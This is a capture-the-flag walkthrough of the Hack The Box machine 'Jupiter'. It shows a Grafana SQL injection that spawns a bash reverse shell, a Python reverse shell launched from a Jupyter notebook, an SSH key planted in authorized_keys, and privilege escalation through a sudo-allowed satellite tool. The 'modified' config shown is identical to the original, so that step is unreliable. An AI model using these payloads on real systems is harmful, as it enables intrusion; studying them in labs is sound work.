# medium - Jupiter

## User Flag
```bash
.../htb/p8/jupiter➤ curl -I jupiter.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 18 Aug 2023 19:03:15 GMT
Content-Type: text/html
Content-Length: 19680
Last-Modified: Wed, 01 Mar 2023 07:58:53 GMT
Connection: keep-alive
ETag: "63ff05bd-4ce0"
Accept-Ranges: bytes

.../htb/p8/jupiter➤ sudo nmap -n -Pn -sV -O -T4 jupiter.htb
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

I couldn't find anything interesting by looking html source code. I will scan directories and subdomains with `gobuster`.
```bash
z➤ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -u http://jupiter.htb/
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://jupiter.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
...
Found: kiosk.jupiter.htb Status: 200 [Size: 34390]
```

Yep, it is yet another web app, powered by **Grafana**:
```bash
~z➤ curl -s kiosk.jupiter.htb | xurls | sort -u
http://localhost:3000/
https://grafana.com
https://grafana.com/docs/grafana/latest/installation/requirements/#supported-web-browsers
https://grafana.com/grafana/plugins/
https://grafana.com/oss/grafana?utm_source=grafana_footer
```

#### Exploiting Grafana

So, when Grafana works with a SQL databases/datasources, it can ran SQL queries, if we give a pretty wide open permissions to the user that runs the queries behind Grafana, we are exposing it at high risk:
{{< limg "/i/2023-08-21_09-30.png" "SQL Injection in Grafana" >}}

SQL Injection with Revshell bash
```http
"rawSql":"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.8/55555 0>&1\"';",
```

```bash
z➤ nc -lvnp 55555
Connection from 10.10.11.216:51216
bash: cannot set terminal process group (1275): Inappropriate ioctl for device
bash: no job control in this shell
postgres@jupiter:/var/lib/postgresql/14/main$ id
uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)
```

Ok, so navigating through the files, I found an interesting file under /`dev/shm`:
```bash
postgres@jupiter:/var/lib/postgresql/14/main$ find / -type f -perm -0200 -group postgres 2>/dev/null | egrep -v '\/var\/lib|\/proc\/'
<stgres 2>/dev/null | egrep -v '\/var\/lib|\/proc\/'
/dev/shm/PostgreSQL.2348814554
/run/postgresql/14-main.pid
/run/postgresql/.s.PGSQL.5432.lock
/run/postgresql/14-main.pg_stat_tmp/global.stat
/run/postgresql/14-main.pg_stat_tmp/db_0.stat
/run/postgresql/14-main.pg_stat_tmp/db_1.stat
/run/postgresql/14-main.pg_stat_tmp/db_13761.stat
/run/postgresql/14-main.pg_stat_tmp/db_16384.stat
/etc/postgresql/14/main/start.conf
/etc/postgresql/14/main/pg_hba.conf
/etc/postgresql/14/main/pg_ident.conf
/etc/postgresql/14/main/environment
/etc/postgresql/14/main/pg_ctl.conf
/etc/postgresql/14/main/postgresql.conf
```

It is a data file
```bash
postgres@jupiter:/var/lib/postgresql/14/main$ file /dev/shm/PostgreSQL.2348814554
<gresql/14/main$ file /dev/shm/PostgreSQL.2348814554
/dev/shm/PostgreSQL.2348814554: data
postgres@jupiter:/var/lib/postgresql/14/main$ ls /dev/shm
ls /dev/shm
network-simulation.yml
PostgreSQL.2348814554
shadow.data
```

You can see that YAML file which I've thought it was an ansible manifest, but no, I don't what that is but runs some commands for us:
```bash
postgres@jupiter:/var/lib/postgresql/14/main$ cat /dev/shm/network-simulation.yml
<gresql/14/main$ cat /dev/shm/network-simulation.yml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

Reset the terminal:
```txt
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

Modified network-simulation.yml:
```bash
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

Got `juno` user shell:
```bash
postgres@jupiter:/dev/shm$ /tmp/nop -p
nop-5.1$ id
uid=114(postgres) gid=120(postgres) euid=1000(juno) groups=120(postgres),119(ssl-cert)
```


I'm ont able to read the user.txt file, so let's get a real SSH connection:
```bash
nop-5.1$ cat /home/juno/user.txt
cat: /home/juno/user.txt: Permission denied

nop-5.1$ wget http://10.10.14.8:6666/id_rsa.pub
--2023-08-21 14:21:30--  http://10.10.14.8:6666/id_rsa.pub
Connecting to 10.10.14.8:6666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 415 [application/vnd.exstream-package]
Saving to: ‘id_rsa.pub’

id_rsa.pub          100%[===================>]     415  --.-KB/s    in 0s

2023-08-21 14:21:30 (32.7 MB/s) - ‘id_rsa.pub’ saved [415/415]

nop-5.1$ ls
id_rsa.pub  network-simulation.yml  PostgreSQL.1375183350  shadow.data
nop-5.1$ cat id_rsa.pub >> /home/juno/.ssh/authorized_keys
```

Now we are in:
```bash
.../htb/p8/jupiter➤ ssh juno@jupiter.htb
Last login: Mon Aug 21 14:22:53 2023 from 10.10.14.8
...
juno@jupiter:~$ id
uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
juno@jupiter:~$ ls
shadow  shadow-simulation.sh  user.txt
```

## Root Flag

Previously, when running `id` you noticed we belong to grou `science`, lets explore:
```bash
juno@jupiter:~$ find / -type f -group science 2>/dev/null
/opt/solar-flares/flares.csv
/opt/solar-flares/xflares.csv
/opt/solar-flares/map.jpg
/opt/solar-flares/start.sh
/opt/solar-flares/logs/jupyter-2023-03-10-25.log
/opt/solar-flares/logs/jupyter-2023-03-08-37.log
/opt/solar-flares/logs/jupyter-2023-03-08-38.log
/opt/solar-flares/logs/jupyter-2023-03-08-36.log
/opt/solar-flares/logs/jupyter-2023-03-09-11.log
/opt/solar-flares/logs/jupyter-2023-03-09-24.log
/opt/solar-flares/logs/jupyter-2023-03-08-14.log
/opt/solar-flares/logs/jupyter-2023-03-09-59.log
/opt/solar-flares/flares.html
/opt/solar-flares/cflares.csv
/opt/solar-flares/flares.ipynb
/opt/solar-flares/mflares.csv
```

We also have some internal ports  on Listening mode:
```bash
juno@jupiter:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```


Ok, I've noticed multiple logs contains a key token being logged in clear text:
```bash
juno@jupiter:~$ cat /opt/solar-flares/logs/*
[W 13:14:40.718 NotebookApp] Terminals not available (error was No module named 'terminado')
[I 13:14:40.727 NotebookApp] Serving notebooks from local directory: /opt/solar-flares
[I 13:14:40.727 NotebookApp] Jupyter Notebook 6.5.3 is running at:
[I 13:14:40.727 NotebookApp] http://localhost:8888/?token=b8055b937eeb17431b3f00dfc5159ba909012d86be120b60
[I 13:14:40.727 NotebookApp]  or http://127.0.0.1:8888/?token=b8055b937eeb17431b3f00dfc5159ba909012d86be120b60
[I 13:14:40.727 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
[W 13:14:40.729 NotebookApp] No web browser found: could not locate runnable browser.
[C 13:14:40.729 NotebookApp]

    To access the notebook, open this file in a browser:
        file:///home/jovian/.local/share/jupyter/runtime/nbserver-865-open.html
    Or copy and paste one of these URLs:
        http://localhost:8888/?token=b8055b937eeb17431b3f00dfc5159ba909012d86be120b60
     or http://127.0.0.1:8888/?token=b8055b937eeb17431b3f00dfc5159ba909012d86be120b60
[I 13:16:21.979 NotebookApp] 302 GET / (127.0.0.1) 0.440000ms
[W 13:16:42.049 NotebookApp] 401 POST /login?next=%2F (127.0.0.1) 2.210000ms referer=http://localhost:8888/login
[I 13:16:50.496 NotebookApp] 302 POST /login?next=%2F (127.0.0.1) 0.980000ms
[I 13:16:50.512 NotebookApp] 302 GET / (127.0.0.1) 0.380000ms
[I 11:01:13.191 NotebookApp] 302 GET / (127.0.0.1) 3.150000ms
[I 11:04:17.407 NotebookApp] 302 POST /login?next=%2F (127.0.0.1) 2.080000ms
[I 11:04:17.413 NotebookApp] 302 GET / (127.0.0.1) 0.350000ms
[I 11:04:41.339 NotebookApp] 302 POST /login?next=%2F (127.0.0.1) 1.390000ms
[I 11:04:41.429 NotebookApp] 302 GET / (127.0.0.1) 0.380000ms
[I 11:08:03.111 NotebookApp] Creating new notebook in
[I 11:08:04.614 NotebookApp] Kernel started: 963e73ea-12e7-4dd5-8096-5bb1b2ef993a, name: python3
[I 11:10:04.589 NotebookApp] Saving file at /Untitled.ipynb
...
...
...
    To access the notebook, open this file in a browser:
        file:///home/jovian/.local/share/jupyter/runtime/nbserver-1178-open.html
    Or copy and paste one of these URLs:
        http://localhost:8888/?token=419e80aa59739d1a9e4fa5adcce88720fbfdde0e0b1fd5e2
     or http://127.0.0.1:8888/?token=419e80aa59739d1a9e4fa5adcce88720fbfdde0e0b1fd5e2
```

Ok, nothing else found here, now going to the web portal of port `8888` (the others ports doesn't work at all): `z➤ ssh -L 8888:127.0.0.1:8888 juno@jupiter.htb`
{{< limg "/i/2023-08-21_10-29.png" "Jupyter notebook service" >}}

#### Pivoting to `jovian`

Interesting, by opening an existing `.ipynb` notebook and opening a rev shell I got the shell for user `jovian`:

Shell
```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",55556));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```
{{< limg "/i/2023-08-21_10-32.png" "rev shell from jupyter" >}}


```bash
.../htb/p8/jupiter➤ nc -lvnp 55556
Connection from 10.10.11.216:53982
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jovian@jupiter:/opt/solar-flares$ id
id
uid=1001(jovian) gid=1002(jovian) groups=1002(jovian),27(sudo),1001(science)
jovian@jupiter:/opt/solar-flares$ pwd
pwd
/opt/solar-flares
jovian@jupiter:/opt/solar-flares$
```

#### Priv Escalation

Ok, now that we are in `jovian` user via ssh, let's explore:
```bash
jovian@jupiter:~$ sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```

So, it expects a config file:
```bash
jovian@jupiter:~$ sudo /usr/local/bin/sattrack
Satellite Tracking System
Configuration file has not been found. Please try again!


jovian@jupiter:~$ strings /usr/local/bin/sattrack | grep -i config
/tmp/config.json
Configuration file has not been found. Please try again!
tleroot not defined in config
...

jovian@jupiter:~$ find / -name config.json 2>/dev/null
/usr/local/share/sattrack/config.json
/usr/local/lib/python3.10/dist-packages/zmq/utils/config.json
```

Humm, doesn't work either, lets take a look on that config.json
```bash
jovian@jupiter:~$ sudo /usr/local/bin/sattrack /usr/local/share/sattrack/config.json
Satellite Tracking System
Configuration file has not been found. Please try again!


jovian@jupiter:~$ cp /usr/local/share/sattrack/config.json /tmp/config.json
jovian@jupiter:~$ cat /tmp/config.json
{
        "tleroot": "/tmp/tle/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "http://celestrak.org/NORAD/elements/weather.txt",
                "http://celestrak.org/NORAD/elements/noaa.txt",
                "http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}
```

Well, ok, based on its documentation it does something: https://github.com/cole-hsv/sattrack

```bash
jovian@jupiter:~$ sudo /usr/local/bin/sattrack /usr/local/share/sattrack/config.json update
Satellite Tracking System
tleroot does not exist, creating it: /tmp/tle/
Get:0 http://celestrak.org/NORAD/elements/weather.txt
...
```

It is pulling files into `/tmp/tle`, which means we can pull /root/root.txt
```bash
jovian@jupiter:~$ sudo /usr/local/bin/sattrack /tmp/config.json update
Satellite Tracking System
Get:0 file:///root/root.txt
Get:1 http://celestrak.org/NORAD/elements/weather.txt
^C
jovian@jupiter:~$ file /tmp/tle/root.txt
/tmp/tle/root.txt: ASCII text
```

## TODOs

- Read about Postgresql CVE RCE vulnerability
- Advanced uses of `find` command
